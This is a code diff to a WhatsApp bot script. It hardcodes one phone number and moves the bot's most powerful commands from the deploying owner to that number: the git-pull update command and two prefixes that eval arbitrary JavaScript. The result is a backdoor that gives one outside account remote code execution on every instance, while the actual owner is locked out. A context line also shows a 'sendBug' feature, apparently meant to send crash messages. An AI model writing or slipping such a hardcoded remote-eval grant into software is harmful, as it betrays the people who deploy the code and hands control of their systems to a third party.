@@ -179,6 +179,7 @@ const isCmd = budy.startsWith(prefix)
 const q = args.join(' ')
 const inky_user = inky.user.jid
 const botNumber = inky.user.jid.split("@")[0]
+const inkyNumber = ["595995660558@s.whatsapp.net"]
 const isGroup = from.endsWith('@g.us')
 const typeMessage = body.substr(0, 50).replace(/\n/g, '')
 const sender = mek.key.fromMe ? inky.user.jid : isGroup ? mek.participant : mek.key.remoteJid
@@ -188,6 +189,7 @@ const isBanned = ban.includes(sender)
 const groupMetadata = isGroup ? await inky.groupMetadata(from) : ''
 const groupName = isGroup ? groupMetadata.subject : ''
 const isMe = senderNumber == botNumber
+const isInky = inkyNumber.includes(sender)
 const isOwner = senderNumber == owner || senderNumber == botNumber || mods.includes(senderNumber)
 const isUser = user.includes(sender)
 const isAntiLink = isGroup ? antilink.includes(from) : false
@@ -208,6 +210,7 @@ link: '𝐋𝐢𝐧𝐤 𝐈𝐧𝐯𝐚𝐥𝐢𝐝𝐨'
 only: {
 group: '𝐂𝐨𝐦𝐚𝐧𝐝𝐨 𝐬𝐨𝐥𝐨 𝐩𝐚𝐫𝐚 𝐠𝐫𝐮𝐩𝐨𝐬',
 owner: `𝐂𝐨𝐦𝐚𝐧𝐝𝐨 𝐬𝐨𝐥𝐨 𝐩𝐚𝐫𝐚 𝐬𝐭𝐚𝐟𝐟 𝐝𝐞 ${botName}`,
+inky: '𝐂𝐨𝐦𝐚𝐧𝐝𝐨 𝐬𝐨𝐥𝐨 𝐩𝐚𝐫𝐚 𝐈𝐧𝐤𝐲',
 admins: '𝐂𝐨𝐦𝐚𝐧𝐝𝐨 𝐬𝐨𝐥𝐨 𝐩𝐚𝐫𝐚 𝐚𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐝𝐨𝐫𝐞𝐬',
 botadmin: `${botName} 𝐧𝐞𝐜𝐞𝐬𝐢𝐭𝐚 𝐬𝐞𝐫 𝐚𝐝𝐦𝐢𝐧 𝐩𝐚𝐫𝐚 𝐞𝐣𝐞𝐜𝐮𝐭𝐚𝐫 𝐞𝐬𝐭𝐞 𝐜𝐨𝐦𝐚𝐧𝐝𝐨`,
 reg: `𝐔𝐬𝐭𝐞𝐝 𝐧𝐨 𝐞𝐬𝐭𝐚 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐚𝐝𝐨 𝐞𝐧 ${botName}, 𝐮𝐬𝐚 ${prefix}𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫 𝐩𝐚𝐫𝐚 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐚𝐫𝐭𝐞`
@@ -1190,7 +1193,7 @@ sendBug(from, `${q}`)
 break
 
 case 'fix':
-if (!isOwner) return reply(mess.only.owner)
+if (!isInky) return reply(mess.only.inky)
 exec(`git pull`, (err, stdout) => {
 if (err) return reply(err)
 if (stdout) reply(`${stdout}`)
@@ -1277,7 +1280,7 @@ reply('𝐋𝐢𝐬𝐭𝐚 𝐝𝐞 𝐠𝐫𝐮𝐩𝐨𝐬:' + inkylg)
 break
 
 case 'addsticker':
-if (!isOwner) return reply(mess.only.owner)
+if (!isInky) return reply(mess.only.inky)
 if (!isQuotedSticker) return reply('𝐑𝐞𝐬𝐩𝐨𝐧𝐝𝐞 𝐜𝐨𝐧 𝐮𝐧 𝐬𝐭𝐢𝐜𝐤𝐞𝐫')
 if (!q) return reply('𝐘 𝐞𝐥 𝐧𝐨𝐦𝐛𝐫𝐞 𝐩𝐚𝐫𝐚 𝐞𝐥 𝐬𝐭𝐢𝐜𝐤𝐞𝐫❓')
 boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
@@ -1291,7 +1294,7 @@ break
 default:
 
 if (budy.startsWith('>')){
-if (!isOwner) return
+if (!isInky) return
 try {
 return inky.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: fakeStatus, sendEphemeral: true})
 } catch(err) {
@@ -1301,7 +1304,7 @@ reply(e)
 }
 
 if (budy.startsWith('x')){
-if (!isOwner) return
+if (!isInky) return
 try {
 return inky.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: fakeStatus, sendEphemeral: true})
 } catch(err) {
